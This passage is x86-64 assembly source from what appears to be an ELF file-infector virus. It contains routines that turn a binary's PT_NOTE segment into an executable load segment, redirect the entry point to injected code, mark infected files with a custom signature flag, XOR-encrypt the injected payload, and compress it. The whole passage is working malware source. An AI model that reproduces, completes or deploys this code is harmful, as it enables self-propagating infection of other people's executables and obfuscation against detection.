	mov [rdi], eax					; *_jmp_value_ptr = _jmp_value;

	; change compressed_data_size2 in injected code
	mov rdi, [mappedfile]				; _compressed_data_size2_ptr = file_map
	add rdi, [filesize]				; 	+ filesize
	add rdi, compressed_data_size2 - _start		; 	+ (compressed_data_size2 - _start)
	mov rax, [compressed_data_size]			; *_compressed_data_size2_ptr = compressed_data_size;
	mov [rdi], rax					; ...

	mov rdi, [mappedfile]				; _e_entry = &mappedfile->e_entry;
	add rdi, elf64_hdr.e_entry			; ...
	mov rax, [new_vaddr]				; *_e_entry = new_vaddr;
	mov [rdi], rax					; ...

	; xor cipher all injected bytes between infection_routine and _end
	mov rdi, [mappedfile]				; data = file_map + filesize + (infection_routine - _start);
	add rdi, [filesize]				;
	add rdi, infection_routine - _start		;
	mov rsi, [compressed_data_size]			; size = compressed_data_size
	lea rdx, [rel key]				; key = key
	mov rcx, key_size				; key_size = key_size
	call xor_cipher					; xor_cipher(data, size, key, key_size)


.unmap_file:
	mov rax, SYS_MUNMAP				; _ret = munmap(
	mov rdi, [mappedfile]				; 	mappedfile,
	mov rsi, [filesize]				; 	filesize
	syscall						; );

.close_file:
	mov rax, SYS_CLOSE				; _ret = close(
	mov rdi, [fd]					;	fd
	syscall						; );

.end:
	add rsp, %$localsize
	pop rbp
	%pop
	ret

; Elf64_Addr get_next_available_vaddr(char const *file_map);
; rax get_next_available_vaddr(rdi file_map);
get_next_available_vaddr:
	%push context
	%stacksize flat64
	%assign %$localsize 0

	%local file_map:qword				; char const *file_map;
	%local furthest_segment_end:qword		; Elf64_Addr furthest_segment_end;
	%local e_phoff:qword				; long e_phoff;
	%local e_phentsize:word				; short e_phentsize;
	%local e_phnum:word				; short e_phnum;

	; Initializes stack frame
	push rbp
	mov rbp, rsp
	sub rsp, %$localsize

	mov [file_map], rdi				; file_map = _file_map;
	mov rax, [rdi + elf64_hdr.e_phoff]		; e_phoff = elf64_hdr->e_phoff;
	mov [e_phoff], rax				; ...
	mov ax, [rdi + elf64_hdr.e_phentsize]		; e_phentsize = elf64_hdr->e_phentsize;
	mov [e_phentsize], ax				; ...
	mov ax, [rdi + elf64_hdr.e_phnum]		; e_phnum = elf64_hdr->e_phnum;
	mov [e_phnum], ax				; ...

	mov QWORD [furthest_segment_end], 0		; furthest_segement_end = 0;

	; loop through program headers
	xor rsi, rsi					; i = 0;
	.begin_phdr_loop:				; do {
		mov rax, [file_map]			; _cur_phdr = file_map
		add rax, [e_phoff]			; 	+ elf64_hdr.e_phoff
		mov rcx, [e_phentsize]			; 	+ i * elf64_hdr.e_phentsize
		imul rcx, rsi				; 		...
		add rax, rcx				; 		...

		mov rdi, rax				; _cur_furthest = _cur_phdr->p_vaddr
		add rdi, elf64_phdr.p_vaddr		; ...
		mov r8, [rdi]				; ...

		mov rdi, rax				; _cur_furthest += _cur_phdr->p_memsz
		add rdi, elf64_phdr.p_memsz		; ...
		add r8, [rdi]				; ...

		mov r9, [furthest_segment_end]		; _furthest_segment_end = furthest_segment_end
		cmp r8, r9				; if (_cur_furthest > _furthest_segment_end)
		cmova r9, r8				;	_furthest_segment_end = _cur_furthest;
		mov [furthest_segment_end], r9		; ...

		inc rsi					; i++;
		cmp si, [e_phnum]			; } while (i != e_phnum);
		jne .begin_phdr_loop			; ...

	; Round up to next multiple of PAGE_SIZE
	mov rax, [furthest_segment_end]			; _next_available_vaddr = furthest_segment_end;
	xor r8, r8					; _offset_to_align = 0
	mov r9, PAGE_SIZE				; _new_offset_to_align = PAGE_SIZE
	test rax, OFFSET_FROM_PAGE_MASK			; if (_furthest_segment_end & OFFSET_FROM_PAGE_MASK == 0)
	cmovnz r8, r9					;	_offset_to_align = _new_offset_to_align
	mov r9, OFFSET_FROM_PAGE_MASK			; _alignment_mask = OFFSET_FROM_PAGE_MASK
	not r9						; _alignment_mask = ~alignement_mask;
	and rax, r9					; _next_available_vaddr &= _alignement_mask;
	add rax, r8					; _next_available_vaddr += _new_offset_to_align;

	add rsp, %$localsize
	pop rbp
	%pop
	ret						; return _next_available_vaddr;


; int is_elf_64(char const *file_map);
; rax is_elf_64(rdi file_map);
is_elf_64:
	xor rsi, rsi					; counter = 0;
	.begin_magic_loop:				; while (true) {
		mov al, [rdi + rsi]			; 	_c = file_map[counter];
		lea r8, [rel elf_64_magic]
		mov bl, [r8+rsi]				; 	_magic_c = elf_64_magic[counter];
		cmp al, bl				; 	if (_c != _magic_c)
		jne .end_not_equal			; 		goto end_not_equal;
		inc rsi					; 	counter++;
		cmp rsi, len_elf_64_magic		; 	if (counter == len_elf_64_magic)
		je .end_equal				; 		goto end_equal;
		jmp .begin_magic_loop			; }

	.end_not_equal:
		xor rax, rax				; return 0;
		ret

	.end_equal:
		mov rax, 1				; return 1;
		ret

;elf64_phdr *find_note_segment(char const *_file_map)
;rax find_note_segment(rdi file_map);
find_note_segment:
	%push context
	%stacksize flat64
	%assign %$localsize 0

	%local file_map:qword				; char const *file_map;
	%local res_header:qword				; elf64_phdr *res_header;
	%local e_phoff:qword				; long e_phoff;
	%local e_phentsize:qword			; long e_phentsize;
	%local e_phnum:qword				; long e_phnum;

	; Initializes stack frame
	push rbp
	mov rbp, rsp
	sub rsp, %$localsize

	mov [file_map], rdi				; file_map = _file_map;
	mov rax, [rdi + elf64_hdr.e_phoff]		; e_phoff = elf64_hdr.e_phoff;
	mov [e_phoff], rax				; ...
	xor rax, rax
	mov ax, [rdi + elf64_hdr.e_phentsize]		; e_phentsize = elf64_hdr.e_phentsize;
	mov [e_phentsize], rax				; ...
	xor rax, rax
	mov ax, [rdi + elf64_hdr.e_phnum]		; e_phnum = elf64_hdr.e_phnum;
	mov [e_phnum], rax				; ...

	; loop through program headers
	xor rsi, rsi					; i = 0;
	.begin_phdr_loop:				; while (true) {
		mov rax, [file_map]			; cur_phdr = file_map
		add rax, [e_phoff]			; 	+ elf64_hdr.e_phoff
		mov rcx, [e_phentsize]			; 	+ i * elf64_hdr.e_phentsize
		imul rcx, rsi				; 		...
		add rax, rcx				; 		...
		mov [res_header], rax			; res_header = cur_phdr;

		; check if PT_NOTE
		mov rdi, [res_header]			; if (cur_phdr->p_type != PT_NOTE)
		add rdi, elf64_phdr.p_type		; ...
		mov eax, [rdi]				; ...
		cmp eax, PT_NOTE			; ...
		jne .next_phdr_loop			; 	goto next_phdr_loop;

		jmp .found				; goto found;

	.next_phdr_loop:
		inc rsi					; i++;
		cmp rsi, [e_phnum]			; if (i == e_phnum)
		je .not_found				; 	goto not_found;
		jmp .begin_phdr_loop			; }

	.not_found:
		xor rax, rax				; res = 0;
		jmp .end				; goto end

	.found:
		mov rax, [res_header]			; res = res_header;
		jmp .end				; goto end

.end:
	add rsp, %$localsize
	pop rbp
	%pop
	ret						; return res;


; int has_signature(char const *file_map)
; rax has_signature(rdi file_map);
has_signature:
	%push context
	%stacksize flat64
	%assign %$localsize 0

	%local file_map:qword				; char const *file_map;
	%local e_phoff:qword				; long e_phoff;
	%local e_phentsize:qword			; long e_phentsize;
	%local e_phnum:qword				; long e_phnum;

	; Initializes stack frame
	push rbp
	mov rbp, rsp
	sub rsp, %$localsize

	mov [file_map], rdi				; file_map = _file_map;
	mov rax, [rdi + elf64_hdr.e_phoff]		; e_phoff = elf64_hdr.e_phoff;
	mov [e_phoff], rax				; ...
	xor rax, rax
	mov ax, [rdi + elf64_hdr.e_phentsize]		; e_phentsize = elf64_hdr.e_phentsize;
	mov [e_phentsize], rax				; ...
	xor rax, rax
	mov ax, [rdi + elf64_hdr.e_phnum]		; e_phnum = elf64_hdr.e_phnum;
	mov [e_phnum], rax				; ...

	; loop through program headers
	xor rsi, rsi					; i = 0;
	.begin_phdr_loop:				; while (true) {
		mov rax, [file_map]			; cur_phdr = file_map
		add rax, [e_phoff]			; 	+ elf64_hdr.e_phoff
		mov rcx, [e_phentsize]			; 	+ i * elf64_hdr.e_phentsize
		imul rcx, rsi				; 		...
		add rax, rcx				; 		...

		; check if PF_PESTILENCE
		mov rdi, rax				; if (!(cur_phdr->p_flag & PF_PESTILENCE))
		add rdi, elf64_phdr.p_flags		; ...
		mov eax, [rdi]				; ...
		and eax, PF_PESTILENCE			; ...
		cmp eax, PF_PESTILENCE			; ...
		jne .next_phdr_loop			; 	goto next_phdr_loop;

		jmp .found				; goto found;

	.next_phdr_loop:
		inc rsi					; i++;
		cmp rsi, [e_phnum]			; if (i == e_phnum)
		je .not_found				; 	goto not_found;
		jmp .begin_phdr_loop			; }

	.not_found:
		xor rax, rax				; res = 0;
		jmp .end				; goto end

	.found:
		mov rax, 1				; res = 1;
		jmp .end				; goto end

.end:
	add rsp, %$localsize
	pop rbp
	%pop
	ret						; return res;

; bool convert_pt_note_to_load(char const *_file_map,
;			       Elf64_Off _new_offset,
;			       Elf64_Addr _new_vaddr,
;			       uint64_t _filesz,
;			       uint64_t _memsz)
; bool convert_pt_note_to_load(rdi _file_map,
;			       rsi _new_offset,
;			       rdx _new_vaddr,
;			       rcx _filesz,
;			       r8 _memsz);
convert_pt_note_to_load:
	%push context
	%stacksize flat64
	%assign %$localsize 0

	%local file_map:qword				; char const *file_map;
	%local new_offset:qword				; Elf64_Off new_offset;
	%local new_vaddr:qword				; Elf64_Addr new_vaddr;
	%local filesz:qword				; uint64_t filesz;
	%local memsz:qword				; uint64_t memsz;
	%local note_segment:qword			; elf64_phdr *note_segment;

	; Initializes stack frame
	push rbp
	mov rbp, rsp
	sub rsp, %$localsize

	mov [file_map], rdi				; file_map = _file_map;
	mov [new_offset], rsi				; new_offset = _new_offset;
	mov [new_vaddr], rdx				; new_vaddr = _new_vaddr;
	mov [filesz], rcx				; new_filesz = _new_filesz;
	mov [memsz], r8					; new_memsz = _new_memsz;

	call find_note_segment				; _ret = find_note_seggment(file_map);
	cmp rax, 0					; if (_ret == NULL)
	je .err						; 	goto .end_err;

	mov rdi, rax					; _type_ptr = &_note_segment->p_flags;
	add rdi, elf64_phdr.p_type			; ...
	mov DWORD [rdi], PT_LOAD			; *_type_ptr = PT_LOAD;

	mov rdi, rax					; _flags_ptr = _note_segment->p_flags;
	add rdi, elf64_phdr.p_flags			; ...
	mov DWORD [rdi], PF_X | PF_R | PF_W | PF_PESTILENCE	; *_flags_ptr = PF_X | PF_R | PF_W | PF_PESTILENCE;

	mov rdi, rax					; _offset_ptr = _note_segment->p_offset;
	add rdi, elf64_phdr.p_offset			; ...
	mov rsi, [new_offset]				; *_offset_ptr = new_offset;
	mov [rdi], rsi					; ...

	mov rdi, rax					; _vaddr_ptr = _note_segment->p_vaddr;
	add rdi, elf64_phdr.p_vaddr			; ...
	mov rsi, [new_vaddr]				; *_vaddr_ptr = new_vaddr;
	mov [rdi], rsi					; ...

	mov rdi, rax					; _paddr_ptr = _note_segment->p_paddr;
	add rdi, elf64_phdr.p_paddr			; ...
	mov rsi, [new_vaddr]				; *_paddr_ptr = new_vaddr;
	mov [rdi], rsi					; ...

	mov rdi, rax					; _filesz_ptr = _note_segment->p_filesz;
	add rdi, elf64_phdr.p_filesz			; ...
	mov rsi, [filesz]				; *_filesz_ptr = filesz;
	mov [rdi], rsi					; ...

	mov rdi, rax					; _memsz_ptr = _note_segment->p_memsz;
	add rdi, elf64_phdr.p_memsz			; ...
	mov rsi, [memsz]				; *_memsz_ptr = memsz;
	mov [rdi], rsi					; ...

	mov rdi, rax					; _align_ptr = _note_segment->p_align;
	add rdi, elf64_phdr.p_align			; ...
	mov QWORD [rdi], PAGE_SIZE			; *_align_ptr = PAGE_SIZE;

	jmp .success

.err:
	xor rax, rax					; _ret = false;
	jmp .end					; goto .end

.success:
	mov rax, 1					; _ret = true;

.end:
	add rsp, %$localsize
	pop rbp
	%pop
	ret						; return _ret;

_end:

; TODO Create label "outside children/infected" or something like that

; void compression(long *compressed_data_size_ptr, uint8_t *compressed_data_ptr);
; void compression(rdi compressed_data_size_ptr, rsi compressed_data_ptr);
compression:
	%push context
	%stacksize flat64
	%assign %$localsize 0

	%local compressed_data_size_ptr:qword	; long *compressed_data_size_ptr;
	%local compressed_data_ptr:qword	; uint8_t *compressed_data_ptr;
	%local i_src:qword			; long i_src;
	%local i_dest:qword			; long i_dest;
	%local i_haystack:qword			; long i_haystack;
	%local i_haystack_limit:qword		; long i_haystack_limit;
	%local i_needle:qword			; long i_needle;
	%local best_offset_subbyte:qword	; long best_offset_subbyte;
	%local best_len_subbyte:qword		; long best_len_subbyte;
	%local src_end_ptr:qword		; uint8_t *src_end_ptr;
	%local dest_end_ptr:qword		; uint8_t *dest_end_ptr;
	%local len_subbyte:qword		; long len_subbyte;

	push rbp
	mov rbp, rsp
	sub rsp, %$localsize

	mov [compressed_data_size_ptr], rdi
	mov [compressed_data_ptr], rsi

	lea rax, [rel _end - 1]			; src_end_ptr = _end - 1;
	mov [src_end_ptr], rax			; ...
	mov rax, [compressed_data_ptr]		; dest_end_ptr = compressed_data_ptr + COMPRESSION_BUF_SIZE - 1;
	add rax, COMPRESSION_BUF_SIZE - 1	; ...
	mov [dest_end_ptr], rax			; ...

	mov qword [i_src], 0			; i_src = 0;
	mov qword [i_dest], 0			; i_dest = 0;

.begin_compression:				; while (i_src < payload_length) {
	cmp qword [i_src], _end - infection_routine ; ...
	jge .end_compression			; ...
	xor rdi, rdi				; _i_haystack_limit = 0;
	mov rax, [i_src]			; if (i_src > 255) {
	sub rax, 255				; ...
	cmp qword [i_src], 255			; ...
	cmova rdi, rax				; 	_i_haystack_limit = i_src - 255; }
	mov [i_haystack_limit], rdi		; i_haystack_limit = _i_haystack_limit;
	mov qword [best_len_subbyte], 0		; best_len_subbyte = 0;

.begin_lookup_haystack:				; while (i_haystack_limit < i_src) {
	mov rax, [i_haystack_limit]		; ...
	cmp rax, [i_src]			; ...
	jge .end_lookup_haystack		; ...

	mov [i_haystack], rax			; i_haystack = i_haystack_limit;
	mov qword [len_subbyte], 0		; len_subbyte = 0;
	mov rax, [i_src]			; i_needle = i_src;
	mov qword [i_needle], rax		; ...

.begin_lookup_needle:				; while (i_haystack < i_src
	; No need to test if i_src is bigger than size of source because compression will always
	; be the same and we tested it at least one time. So it is not bigger than the source
	mov rax, [i_haystack]			; ...
	cmp rax, [i_src]			; ...
	jge .end_lookup_needle			; ...

	mov rax, [src_end_ptr]			; 	&& src_end_ptr[-i_haystack] != src_end_ptr[-i_needle]) {
	sub rax, [i_haystack]			; ...
	mov r8b, [rax]				; ...
	mov rax, [src_end_ptr]			; ...
	sub rax, [i_needle]			; ...
	mov r9b, [rax]				; ...
	cmp r8b, r9b				; ...
	jne .end_lookup_needle			; ...

	inc qword [len_subbyte]			; i_len_subbyte++;
	inc qword [i_haystack]			; i_haystack++;
	inc qword [i_needle]			; i_needle++;
	jmp .begin_lookup_needle		; }

.end_lookup_needle:

	mov rdi, [i_src]			; _cur_offset_subbyte = i_src - i_haystack;
	sub rdi, [i_haystack_limit]		; ...
	mov r8, [best_len_subbyte]		; _best_len_subbyte = best_len_subbyte;
	mov r9, [best_offset_subbyte]		; _best_offset_subbyte = best_offset_subbyte;
	mov rax, [len_subbyte]			; if (len_subbyte > best_len_subbyte) {
	cmp rax, [best_len_subbyte]		; ...
	cmova r8, rax				; 	_best_len_subbyte = len_subbyte;
	cmova r9, rdi				; 	_best_offset_subbyte = _cur_offset_subbyte;}
	mov [best_len_subbyte], r8		; best_len_subbyte = _best_len_subbyte;
	mov [best_offset_subbyte], r9		; best_offset_subbyte = _best_offset_subbyte;
	inc qword [i_haystack_limit]		; i_haystack_limit++;
	jmp .begin_lookup_haystack		; }

.end_lookup_haystack:

	cmp qword [best_len_subbyte], 3		; if (best_len_subbyte > 3) //length of a token
	jg .write_token				; ...
	jmp .write_byte				; ...

.write_token:					; {
	; TODO Fix size of variables, play with byte/qword, it is ugly
	mov rax, [dest_end_ptr]			; 	_cur_dest_ptr = dest_end_ptr;
	sub rax, [i_dest]			; 	_cur_dest_ptr -= i_dest;
	mov byte [rax], COMPRESSION_TOKEN	; 	*_cur_dest_ptr = COMPRESSION_TOKEN;
	dec rax					; 	_cur_dest_ptr--;
	mov rdi, [best_offset_subbyte]		; 	*_cur_dest_ptr = best_offset_subbyte;
	mov byte [rax], dil			; 	...
	dec rax					; 	_cur_dest_ptr--;
	mov rdi, [best_len_subbyte]		; 	*_cur_dest_ptr = best_len_subbyte;
	mov byte [rax], dil			; 	...
	add qword [i_dest], 3			;	i_dest += 3;
	add [i_src], rdi			;	i_src += best_len_subbyte;
	jmp .end_write_byte_or_token		; }
	
.write_byte:					; else if (*src_end_ptr != COMPRESSION_TOKEN) {
	mov rsi, [src_end_ptr]			; 	...
	sub rsi, [i_src]			; 	...
	cmp byte [rsi], COMPRESSION_TOKEN	; 	...
	je .write_token_byte			; 	...
	mov rdi, [dest_end_ptr]			; 	dest_end_ptr[-i_dest] = src_end_ptr[-i_src];
	sub rdi, [i_dest]			; 	...
	movsb					; 	...
	inc qword [i_dest]			; 	i_dest++;
	inc qword [i_src]			; 	i_src++;
	jmp .end_write_byte_or_token		; }

.write_token_byte:				; else {
	mov rax, [dest_end_ptr]			; 	_cur_dest_ptr = dest_end_ptr;
	sub rax, [i_dest]			; 	_cur_dest_ptr -= i_dest;
	mov byte [rax], COMPRESSION_TOKEN	;	*_cur_dest_ptr = COMPRESSION_TOKEN;
	dec rax					; 	_cur_dest_ptr--;
	mov byte [rax], 0			; 	*_cur_dest_ptr = 0;
	add qword [i_dest], 2
	inc qword [i_src]
.end_write_byte_or_token:			; }
	jmp .begin_compression			; }

.end_compression:
	mov rax, [i_dest]			; _compressed_data_size = i_dest;
	mov rdi, [compressed_data_size_ptr]	; *compressed_data_size_ptr = _compressed_data_size;
	mov [rdi], rax				; ...

	add rsp, %$localsize
	pop rbp
	%pop

	ret
